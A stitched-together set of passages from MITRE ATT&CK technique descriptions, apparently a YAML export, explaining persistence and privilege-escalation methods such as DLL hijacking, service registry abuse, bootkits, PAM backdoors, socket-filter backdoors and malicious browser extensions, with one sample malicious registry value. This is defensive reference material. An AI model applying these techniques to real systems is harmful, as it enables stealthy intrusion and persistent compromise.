        compromise of the cloud environment. For example, an adversary may use the
        `IAM:PassRole` permission in AWS or the `iam.serviceAccounts.actAs` permission
        in Google Cloud to add [Additional Cloud Roles](https://attack.mitre.org/techniques/T1098/003)
        to a serverless cloud function, which may then be able to perform actions
        the original user cannot.(Citation: Rhino Security Labs AWS Privilege Escalation)(Citation:
        Rhingo Security Labs GCP Privilege Escalation)\n\nServerless functions can
        also be invoked in response to cloud events (i.e. [Event Triggered Execution](https://attack.mitre.org/techniques/T1546)),
        potentially enabling persistent execution over time. For example, in AWS environments,
        an adversary may create a Lambda function that automatically adds [Additional
        Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) to a user
        and a corresponding CloudWatch events rule that invokes that function whenever
        a new user is created.(Citation: Backdooring an AWS account) This is also
        possible in many cloud-based office application suites. For example, in Microsoft
        365 environments, an adversary may create a Power Automate workflow that forwards
        all emails a user receives or creates anonymous sharing links whenever a user
        is granted access to a document in SharePoint.(Citation: Varonis Power Automate
        Data Exfiltration)(Citation: Microsoft DART Case Report 001) In Google Workspace
        environments, they may instead create an Apps Script that exfiltrates a user's

        Adversaries may abuse the Windows service control manager to execute malicious commands or payloads. The Windows service control manager (<code>services.exe</code>) is an interface to manage and manipulate services.(Citation: Microsoft Service Control Manager) The service control manager is accessible to users via GUI components as well as system utilities such as <code>sc.exe</code> and [Net](https://attack.mitre.org/software/S0039).

        [PsExec](https://attack.mitre.org/software/S0029) can also be used to execute commands or payloads via a temporary Windows service created through the service control manager API.(Citation: Russinovich Sysinternals) Tools such as [PsExec](https://attack.mitre.org/software/S0029) and <code>sc.exe</code> can accept remote servers as arguments and may be used to conduct remote execution.

        Adversaries may leverage these mechanisms to execute malicious content. This can be done by either executing a new or modified service. This technique is the execution used in conjunction with [Windows Service](https://attack.mitre.org/techniques/T1543/003) during service persistence or privilege escalation.

        Adversaries may abuse the [at](https://attack.mitre.org/software/S0110) utility to perform task scheduling for initial or recurring execution of malicious code. The [at](https://attack.mitre.org/software/S0110) utility exists as an executable within Windows, Linux, and macOS for scheduling tasks at a specified time and date. Although deprecated in favor of [Scheduled Task](https://attack.mitre.org/techniques/T1053/005)'s [schtasks](https://attack.mitre.org/software/S0111) in Windows environments, using [at](https://attack.mitre.org/software/S0110) requires that the Task Scheduler service be running, and the user to be logged on as a member of the local Administrators group. In addition to explicitly running the `at` command, adversaries may also schedule a task with [at](https://attack.mitre.org/software/S0110) by directly leveraging the [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) `Win32_ScheduledJob` WMI class.(Citation: Malicious Life by Cybereason)

        On Linux and macOS, [at](https://attack.mitre.org/software/S0110) may be invoked by the superuser as well as any users added to the <code>at.allow</code> file. If the <code>at.allow</code> file does not exist, the <code>at.deny</code> file is checked. Every username not listed in <code>at.deny</code> is allowed to invoke [at](https://attack.mitre.org/software/S0110). If the <code>at.deny</code> exists and is empty, global use of [at](https://attack.mitre.org/software/S0110) is permitted. If neither file exists (which is often the baseline) only the superuser is allowed to use [at](https://attack.mitre.org/software/S0110).(Citation: Linux at)

        Adversaries may use [at](https://attack.mitre.org/software/S0110) to execute programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003). [at](https://attack.mitre.org/software/S0110) can also be abused to conduct remote [Execution](https://attack.mitre.org/tactics/TA0002) as part of [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or to run a process under the context of a specified account (such as SYSTEM).

        In Linux environments, adversaries may also abuse [at](https://attack.mitre.org/software/S0110) to break out of restricted environments by using a task to spawn an interactive system shell or to run system commands. Similarly, [at](https://attack.mitre.org/software/S0110) may also be used for [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) if the binary is allowed to run as superuser via <code>sudo</code>.(Citation: GTFObins at)

        multiple ways to access the Task Scheduler in Windows. The [schtasks](https://attack.mitre.org/software/S0111)
        utility can be run directly on the command line, or the Task Scheduler can
        be opened through the GUI within the Administrator Tools section of the Control
        Panel.(Citation: Stack Overflow) In some cases, adversaries have used a .NET
        wrapper for the Windows Task Scheduler, and alternatively, adversaries have
        used the Windows netapi32 library and [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047)

        Adversaries may attach filters to a network socket to monitor then activate backdoors used for persistence or command and control. With elevated permissions, adversaries can use features such as the `libpcap` library to open sockets and install filters to allow or disallow certain types of data to come through the socket. The filter may apply to all traffic passing through the specified network interface (or every interface if not specified). When the network interface receives a packet matching the filter criteria, additional actions can be triggered on the host, such as activation of a reverse shell.

        To establish a connection, an adversary sends a crafted packet to the targeted host that matches the installed filter criteria.(Citation: haking9 libpcap network sniffing) Adversaries have used these socket filters to trigger the installation of implants, conduct ping backs, and to invoke command shells. Communication with these socket filters may also be used in conjunction with [Protocol Tunneling](https://attack.mitre.org/techniques/T1572).(Citation: exatrack bpf filters passive backdoors)(Citation: Leonardo Turla Penquin May 2020)

        Filters can be installed on any Unix-like platform with `libpcap` installed or on Windows hosts using `Winpcap`.  Adversaries may use either `libpcap` with `pcap_setfilter` or the standard library function `setsockopt` with `SO_ATTACH_FILTER` options. Since the socket connection is not active until the packet is received, this behavior may be difficult to detect due to the lack of activity on a host, low CPU overhead, and limited visibility into raw socket usage.

        Adversaries may modify pluggable authentication modules (PAM) to access user credentials or enable otherwise unwarranted access to accounts. PAM is a modular system of configuration files, libraries, and executable files which guide authentication for many services. The most common authentication module is <code>pam_unix.so</code>, which retrieves, sets, and verifies account authentication information in <code>/etc/passwd</code> and <code>/etc/shadow</code>.(Citation: Apple PAM)(Citation: Man Pam_Unix)(Citation: Red Hat PAM)

        Adversaries may modify components of the PAM system to create backdoors. PAM components, such as <code>pam_unix.so</code>, can be patched to accept arbitrary adversary supplied values as legitimate credentials.(Citation: PAM Backdoor)

        Malicious modifications to the PAM system may also be abused to steal credentials. Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords.(Citation: PAM Creds)(Citation: Apple PAM)

      description: "Adversaries may execute their own malicious payloads by hijacking
        environment variables used to load libraries. The PATH environment variable
        contains a list of directories (User and System) that the OS searches sequentially
        through in search of the binary that was called from a script or the command
        line. \n\nAdversaries can place a malicious program in an earlier entry in
        the list of directories stored in the PATH environment variable, resulting
        in the operating system executing the malicious binary rather than the legitimate
        binary when it searches sequentially through that PATH listing.\n\nFor example,
        on Windows if an adversary places a malicious program named \"net.exe\" in
        `C:\\example path`, which by default precedes `C:\\Windows\\system32\\net.exe`
        in the PATH environment variable, when \"net\" is executed from the command-line
        the `C:\\example path` will be called instead of the system's legitimate executable
        at `C:\\Windows\\system32\\net.exe`. Some methods of executing a program rely
        on the PATH environment variable to determine the locations that are searched
        when the path for the program is not given, such as executing programs from
        a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059).(Citation:

        the $PATH variable specifying the directories to be searched.  An adversary
        can modify the `$PATH` variable to point to a directory they have write access.
        When a program using the $PATH variable is called, the OS searches the specified
        directory and executes the malicious binary. On macOS, this can also be performed
        through modifying the $HOME variable. These variables can be modified using
        the command-line, launchctl, [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004),

        Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as [Windows Remote Management](https://attack.mitre.org/techniques/T1021/006) and [VNC](https://attack.mitre.org/techniques/T1021/005) can also be used externally.(Citation: MacOS VNC software for Remote Desktop)

        Access to [Valid Accounts](https://attack.mitre.org/techniques/T1078) to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network.(Citation: Volexity Virtual Private Keylogging) Access to remote services may be used as a redundant or persistent access mechanism during an operation.

        Access may also be gained through an exposed service that doesn’t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.(Citation: Trend Micro Exposed Docker Server)(Citation: Unit 42 Hildegard Malware)

        Adversaries may also establish persistence on network by configuring a Tor hidden service on a compromised system. Adversaries may utilize the tool `ShadowLink` to facilitate the installation and configuration of the Tor hidden service. Tor hidden service is then accessible via the Tor network because `ShadowLink` sets up a .onion address on the compromised system. `ShadowLink` may be used to forward any inbound connections to RDP, allowing the adversaries to have remote access.(Citation: The BadPilot campaign) Adversaries may get `ShadowLink` to persist on a system by masquerading it as an MS Defender application.(Citation: Russian threat actors dig in, prepare to seize on war fatigue)

      description: |-
        Adversaries may establish persistence by executing malicious content triggered by the execution of tainted binaries. Mach-O binaries have a series of headers that are used to perform certain operations when a binary is loaded. The LC_LOAD_DYLIB header in a Mach-O binary tells macOS and OS X which dynamic libraries (dylibs) to load during execution time. These can be added ad-hoc to the compiled binary as long as adjustments are made to the rest of the fields and dependencies.(Citation: Writing Bad Malware for OSX) There are tools available to perform these changes.

        Adversaries may modify Mach-O binary headers to load and execute malicious dylibs every time the binary is executed. Although any changes will invalidate digital signatures on binaries because the binary is being modified, this can be remediated by simply removing the LC_CODE_SIGNATURE command from the binary so that the signature isn’t checked at load time.(Citation: Malware Persistence on OS X)

        Adversaries may abuse task scheduling functionality provided by container orchestration tools such as Kubernetes to schedule deployment of containers configured to execute malicious code. Container orchestration jobs run these automated tasks at a specific date and time, similar to cron jobs on a Linux system. Deployments of this type can also be configured to maintain a quantity of containers over time, automating the process of maintaining persistence within a cluster.

        In Kubernetes, a CronJob may be used to schedule a Job that runs one or more containers to perform specific tasks.(Citation: Kubernetes Jobs)(Citation: Kubernetes CronJob) An adversary therefore may utilize a CronJob to schedule deployment of a Job that executes malicious code in various nodes within a cluster.(Citation: Threat Matrix for Kubernetes)

      name: 'Hijack Execution Flow: Services Registry Permissions Weakness'
      description: |-
        Adversaries may execute their own malicious payloads by hijacking the Registry entries used by services. Flaws in the permissions for Registry keys related to services can allow adversaries to redirect the originally specified executable to one they control, launching their own code when a service starts. Windows stores local service configuration information in the Registry under <code>HKLM\SYSTEM\CurrentControlSet\Services</code>. The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe,  [PowerShell](https://attack.mitre.org/techniques/T1059/001), or [Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled through access control lists and user permissions. (Citation: Registry Key Security)(Citation: malware_hides_service)

        If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's binPath/ImagePath to point to a different executable under their control. When the service starts or is restarted, the adversary-controlled program will execute, allowing the adversary to establish persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService).

        Adversaries may also alter other Registry keys in the service’s Registry tree. For example, the <code>FailureCommand</code> key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted.(Citation: Kansa Service related collectors)(Citation: Tweet Registry Perms Weakness)

        The <code>Performance</code> key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL.(Citation: microsoft_services_registry_tree) If the <code>Performance</code> key is not already present and if an adversary-controlled user has the <code>Create Subkey</code> permission, adversaries may create the <code>Performance</code> key in the service’s Registry tree to point to a malicious DLL.(Citation: insecure_reg_perms)

        Adversaries may also add the <code>Parameters</code> key, which can reference malicious drivers file paths. This technique has been identified to be a method of abuse by configuring DLL file paths within the <code>Parameters</code> key of a given services registry configuration. By placing and configuring the <code>Parameters</code> key to reference a malicious DLL, adversaries can ensure that their code is loaded persistently whenever the associated service or library is invoked.

        For example, the registry path(Citation: MDSec) <code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\WinSock2\Parameters</code>(Citation: hexacorn)(Citation: gendigital) contains the <code>AutodiaDLL</code> value, which specifies the DLL to be loaded for autodial funcitionality. An adversary could set the <code>AutodiaDLL</code> to point to a hijacked or malicious DLL:

        <code>"AutodialDLL"="c:\temp\foo.dll"</code>

        This ensures persistence, as it causes the DLL (in this case, foo.dll) to be loaded each time the Winsock 2 library is invoked.

      name: Bootkit
      description: |-
        Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.

        In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).(Citation: Mandiant M Trends 2016) The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.(Citation: Lau 2011)

        The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.

        In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.(Citation: Microsoft Security)(Citation: welivesecurity)

      description: |-
        Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.

        Since some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.

        Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.

        Adversaries may abuse Active Setup by creating a key under <code> HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)

        Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.

      description: "Adversaries may abuse internet browser extensions to establish
        persistent access to victim systems. Browser extensions or plugins are small
        programs that can add functionality to and customize aspects of internet browsers.
        They can be installed directly via a local file or custom URL or through a
        browser's app store - an official online platform where users can browse,
        install, and manage extensions for a specific web browser. Extensions generally
        inherit the web browser's permissions previously granted.(Citation: Wikipedia
        Browser Extension)(Citation: Chrome Extensions Definition) \n \nMalicious
        extensions can be installed into a browser through malicious app store downloads
        masquerading as legitimate extensions, through social engineering, or by an
        adversary that has already compromised a system. Security can be limited on
        browser app stores, so it may not be difficult for malicious extensions to
        defeat automated scanners.(Citation: Malicious Chrome Extension Numbers) Depending
        on the browser, adversaries may also manipulate an extension's update url
        to install updates from an adversary-controlled server or manipulate the mobile
        configuration file to silently install additional extensions. \n\nAdversaries
        may abuse how chromium-based browsers load extensions by modifying or replacing
        the Preferences and/or Secure Preferences files to silently install malicious
        extensions. When the browser is not running, adversaries can alter these files,
        ensuring the extension is loaded, granted desired permissions, and will persist
        in browser sessions. This method does not require user consent and extensions
        are silently loaded in the background from disk or from the browser's trusted
        store.(Citation: Pulsedive)\n  \nPrevious to macOS 11, adversaries could silently
        install browser extensions via the command line using the <code>profiles</code>
        tool to install malicious <code>.mobileconfig</code> files. In macOS 11+,
        the use of the <code>profiles</code> tool can no longer install configuration
        profiles; however, <code>.mobileconfig</code> files can be planted and installed
        with user interaction.(Citation: xorrior chrome extensions macOS) \n \nOnce
        the extension is installed, it can browse to websites in the background, steal
        all information that a user enters into a browser (including credentials),
        and be used as an installer for a RAT for persistence.(Citation: Chrome Extension
        Crypto Miner)(Citation: ICEBRG Chrome Extensions)(Citation: Banker Google
        Chrome Extension Steals Creds)(Citation: Catch All Chrome Extension) \n\nThere
        have also been instances of botnets using a persistent backdoor through malicious
        Chrome extensions for [Command and Control](https://attack.mitre.org/tactics/TA0011).(Citation:

      description: |-
        Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.

        Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction with [Modify System Image](https://attack.mitre.org/techniques/T1601) to load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar to [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) and may result in the network device running a modified image. (Citation: Cisco Blog Legacy Device Attacks)

      description: "Adversaries may create or modify Windows services to repeatedly
        execute malicious payloads as part of persistence. When Windows boots up,
        it starts programs or applications called services that perform background
        system functions.(Citation: TechNet Services) Windows service configuration
        information, including the file path to the service's executable or recovery
        programs/commands, is stored in the Windows Registry.\n\nAdversaries may install
        a new service or modify an existing service to execute at startup in order
        to persist on a system. Service configurations can be set or modified using
        system utilities (such as sc.exe), by directly modifying the Registry, or
        by interacting directly with the Windows API. \n\nAdversaries may also use
        services to install and execute malicious drivers. For example, after dropping
        a driver file (ex: `.sys`) to disk, the payload can be loaded and registered
        via [Native API](https://attack.mitre.org/techniques/T1106) functions such
        as `CreateServiceW()` (or manually via functions such as `ZwLoadDriver()`
        and `ZwSetValueKey()`), by creating the required service Registry values (i.e.
        [Modify Registry](https://attack.mitre.org/techniques/T1112)), or by using
        command-line utilities such as `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet
        Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42
        AcidBox June 2020) Adversaries may leverage these drivers as [Rootkit](https://attack.mitre.org/techniques/T1014)s
        to hide the presence of malicious activity on a system. Adversaries may also
        load a signed yet vulnerable driver onto a compromised machine (known as \"Bring
        Your Own Vulnerable Driver\" (BYOVD)) as part of [Exploitation for Privilege
        Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole
        June 2020)(Citation: Unit42 AcidBox June 2020)\n\nServices may be created
        with administrator privileges but are executed under SYSTEM privileges, so
        an adversary may also use a service to escalate privileges. Adversaries may
        also directly start services through [Service Execution](https://attack.mitre.org/techniques/T1569/002).\n\nTo
        make detection analysis more challenging, malicious services may also incorporate
        [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004)
        (ex: using a service and/or payload name related to a legitimate OS or benign
        software component). Adversaries may also create ‘hidden’ services (i.e.,
        [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example
        by using the `sc sdset` command to set service permissions via the Service
        Descriptor Definition Language (SDDL). This may hide a Windows service from
        the view of standard service enumeration methods such as `Get-Service`, `sc
        query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)"

        Adversaries may leverage Microsoft Office-based applications for persistence between startups. Microsoft Office is a fairly common application suite on Windows-based operating systems within an enterprise network. There are multiple mechanisms that can be used with Office for persistence when an Office-based application is started; this can include the use of Office Template Macros and add-ins.

        A variety of features have been discovered in Outlook that can be abused to obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost Ruler GitHub) These persistence mechanisms can work within Outlook or be used through Office 365.(Citation: TechNet O365 Outlook Rules)

        Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation: Microsoft Intro Print Processors)

        Adversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key that points to the DLL.

        For the malicious print processor to be correctly installed, the payload must be located in the dedicated system print-processor directory, that can be found with the <code>GetPrintProcessorDirectory</code> API call, or referenced via a relative path from this directory.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020)

        The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.

      name: 'Hijack Execution Flow: DLL'
      description: |-
        Adversaries may abuse dynamic-link library files (DLLs) in order to achieve persistence, escalate privileges, and evade defenses. DLLs are libraries that contain code and data that can be simultaneously utilized by multiple programs. While DLLs are not malicious by nature, they can be abused through mechanisms such as side-loading, hijacking search order, and phantom DLL hijacking.(Citation: unit 42)

        Specific ways DLLs are abused by adversaries include:

        ### DLL Sideloading
        Adversaries may execute their own malicious payloads by side-loading DLLs. Side-loading involves hijacking which DLL a program loads by planting and then invoking a legitimate application that executes their payload(s).

        Side-loading positions both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution. Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process.

        Adversaries may also side-load other packages, such as BPLs (Borland Package Library).(Citation: kroll bpl)

        Adversaries may chain DLL sideloading multiple times to fragment functionality hindering analysis. Adversaries using multiple DLL files can split the loader functions across different DLLs, with a main DLL loading the separated export functions. (Citation: Virus Bulletin) Spreading loader functions across multiple DLLs makes analysis harder, since all files must be collected to fully understand the malware’s behavior.  Another method implements a “loader-for-a-loader”, where a malicious DLL’s sole role is to load a second DLL (or a chain of DLLs) that contain the real payload. (Citation: Sophos)

        ### DLL Search Order Hijacking
        Adversaries may execute their own malicious payloads by hijacking the search order that Windows uses to load DLLs. This search order is a sequence of special and standard search locations that a program checks when loading a DLL. An adversary can plant a trojan DLL in a directory that will be prioritized by the DLL search order over the location of a legitimate library. This will cause Windows to load the malicious DLL when it is called for by the victim program.(Citation: unit 42)

        ### DLL Redirection
        Adversaries may directly modify the search order via DLL redirection, which after being enabled (in the Registry or via the creation of a redirection file) may cause a program to load a DLL from a different location.(Citation: Microsoft redirection)(Citation: Microsoft - manifests/assembly)

        ### Phantom DLL Hijacking
        Adversaries may leverage phantom DLL hijacking by targeting references to non-existent DLL files. They may be able to load their own malicious DLL by planting it with the correct name in the location of the missing module.(Citation: Hexacorn DLL Hijacking)(Citation: Hijack DLLs CrowdStrike)

        ### DLL Substitution
        Adversaries may target existing, valid DLL files and substitute them with their own malicious DLLs, planting them with the same name and in the same location as the valid DLL file.(Citation: Wietze Beukema DLL Hijacking)

        Programs that fall victim to DLL hijacking may appear to behave normally because malicious DLLs may be configured to also load the legitimate DLLs they were meant to replace, evading defenses.

        Remote DLL hijacking can occur when a program sets its current directory to a remote location, such as a Web share, before loading a DLL.(Citation: dll pre load owasp)(Citation: microsoft remote preloading)

        If a valid DLL is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level. In this case, the technique could be used for privilege escalation.

        Adversaries may abuse task scheduling functionality to facilitate initial or recurring execution of malicious code. Utilities exist within all major operating systems to schedule programs or scripts to be executed at a specified date and time. A task can also be scheduled on a remote system, provided the proper authentication is met (ex: RPC and file and printer sharing in Windows environments). Scheduling a task on a remote system typically may require being a member of an admin or otherwise privileged group on the remote system.(Citation: TechNet Task Scheduler Security)

        Adversaries may use task scheduling to execute programs at system startup or on a scheduled basis for persistence. These mechanisms can also be abused to run a process under the context of a specified account (such as one with elevated permissions/privileges). Similar to [System Binary Proxy Execution](https://attack.mitre.org/techniques/T1218), adversaries have also abused task scheduling to potentially mask one-time execution under a trusted system process.(Citation: ProofPoint Serpent)

        libraries (DLLs) into the authentication process to acquire user credentials
        as they are validated. \n\nWindows password filters are password policy enforcement
        mechanisms for both domain and local accounts. Filters are implemented as
        DLLs containing a method to validate potential passwords against password
        policies. Filter DLLs can be positioned on local computers for local accounts
        and/or domain controllers for domain accounts. Before registering new passwords
        in the Security Accounts Manager (SAM), the Local Security Authority (LSA)
        requests validation from each registered filter. Any potential changes cannot
        take effect until every registered filter acknowledges validation. \n\nAdversaries
        can register malicious password filters to harvest credentials from local
        computers and/or entire domains. To perform proper validation, filters must
        receive plain-text credentials from the LSA. A malicious password filter would
        receive these plain-text credentials every time a password request is made.(Citation:

      description: |-
        Adversaries may abuse components of Terminal Services to enable persistent access to systems. Microsoft Terminal Services, renamed to Remote Desktop Services in some Windows Server OSs as of 2022, enable remote terminal connections to hosts. Terminal Services allows servers to transmit a full, interactive, graphical user interface to clients via RDP.(Citation: Microsoft Remote Desktop Services)

        [Windows Service](https://attack.mitre.org/techniques/T1543/003)s that are run as a "generic" process (ex: <code>svchost.exe</code>) load the service's DLL file, the location of which is stored in a Registry entry named <code>ServiceDll</code>.(Citation: Microsoft System Services Fundamentals) The <code>termsrv.dll</code> file, typically stored in `%SystemRoot%\System32\`, is the default <code>ServiceDll</code> value for Terminal Services in `HKLM\System\CurrentControlSet\services\TermService\Parameters\`.

        Adversaries may modify and/or replace the Terminal Services DLL to enable persistent access to victimized hosts.(Citation: James TermServ DLL) Modifications to this DLL could be done to execute arbitrary payloads (while also potentially preserving normal <code>termsrv.dll</code> functionality) as well as to simply enable abusable features of Terminal Services. For example, an adversary may enable features such as concurrent [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) sessions by either patching the <code>termsrv.dll</code> file or modifying the <code>ServiceDll</code> value to point to a DLL that provides increased RDP functionality.(Citation: Windows OS Hub RDP)(Citation: RDPWrap Github) On a non-server Windows OS this increased functionality may also enable an adversary to avoid Terminal Services prompts that warn/log out users of a system when a new RDP session is created.

      description: "Adversaries may establish persistence and/or elevate privileges
        by executing malicious content triggered by application shims. The Microsoft
        Windows Application Compatibility Infrastructure/Framework (Application Shim)
        was created to allow for backward compatibility of software as the operating
        system codebase changes over time. For example, the application shimming feature
        allows developers to apply fixes to applications (without rewriting code)
        that were created for Windows XP so that it will work with Windows 10. (Citation:
        Elastic Process Injection July 2017)\n\nWithin the framework, shims are created
        to act as a buffer between the program (or more specifically, the Import Address
        Table) and the Windows OS. When a program is executed, the shim cache is referenced
        to determine if the program requires the use of the shim database (.sdb).
        If so, the shim database uses hooking to redirect the code as necessary in
        order to communicate with the OS. \n\nA list of all shims currently installed
        by the default Windows installer (sdbinst.exe) is kept in:\n\n* <code>%WINDIR%\\AppPatch\\sysmain.sdb</code>
        and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\installedsdb</code>\n\nCustom
        databases are stored in:\n\n* <code>%WINDIR%\\AppPatch\\custom & %WINDIR%\\AppPatch\\AppPatch64\\Custom</code>
        and\n* <code>hklm\\software\\microsoft\\windows nt\\currentversion\\appcompatflags\\custom</code>\n\nTo
        keep shims secure, Windows designed them to run in user mode so they cannot
        modify the kernel and you must have administrator privileges to install a
        shim. However, certain shims can be used to [Bypass User Account Control](https://attack.mitre.org/techniques/T1548/002)
        (UAC and RedirectEXE), inject DLLs into processes (InjectDLL), disable Data
        Execution Prevention (DisableNX) and Structure Exception Handling (DisableSEH),
        and intercept memory addresses (GetProcAddress).\n\nUtilizing these shims
        may allow an adversary to perform several malicious acts such as elevate privileges,
        install backdoors, disable defenses like Windows Defender, etc. (Citation:
        FireEye Application Shimming) Shims can also be abused to establish persistence
        by continuously being invoked by affected programs."

      name: Traffic Signaling
      description: |-
        Adversaries may use traffic signaling to hide open ports or other malicious functionality used for persistence or command and control. Traffic signaling involves the use of a magic value or sequence that must be sent to a system to trigger a special response, such as opening a closed port or executing a malicious task. This may take the form of sending a series of packets with certain characteristics before a port will be opened that the adversary can use for command and control. Usually this series of packets consists of attempted connections to a predefined sequence of closed ports (i.e. [Port Knocking](https://attack.mitre.org/techniques/T1205/001)), but can involve unusual flags, specific strings, or other unique characteristics. After the sequence is completed, opening a port may be accomplished by the host-based firewall, but could also be implemented by custom software.

        Adversaries may also communicate with an already open port, but the service listening on that port will only respond to commands or trigger other malicious functionality if passed the appropriate magic value(s).

        The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r (Citation: Hartrell cd00r 2002), is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.

        On network devices, adversaries may use crafted packets to enable [Network Device Authentication](https://attack.mitre.org/techniques/T1556/004) for standard services offered by the device such as telnet.  Such signaling may also be used to open a closed service port such as telnet, or to trigger module modification of malware implants on the device, adding, removing, or changing malicious capabilities.  Adversaries may use crafted packets to attempt to connect to one or more (open or closed) ports, but may also attempt to connect to a router interface, broadcast, and network address IP on the same port in order to achieve their goals and objectives.(Citation: Cisco Synful Knock Evolution)(Citation: Mandiant - Synful Knock)(Citation: Cisco Blog Legacy Device Attacks)  To enable this traffic signaling on embedded devices, adversaries must first achieve and leverage [Patch System Image](https://attack.mitre.org/techniques/T1601/001) due to the monolithic nature of the architecture.

        Adversaries may also use the Wake-on-LAN feature to turn on powered off systems. Wake-on-LAN is a hardware feature that allows a powered down system to be powered on, or woken up, by sending a magic packet to it. Once the system is powered on, it may become a target for lateral movement.(Citation: Bleeping Computer - Ryuk WoL)(Citation: AMD Magic Packet)

        Adversaries may create or modify shortcuts that can execute a program during system boot or user login. Shortcuts or symbolic links are used to reference other files or programs that will be opened or executed when the shortcut is clicked or executed by a system startup process.

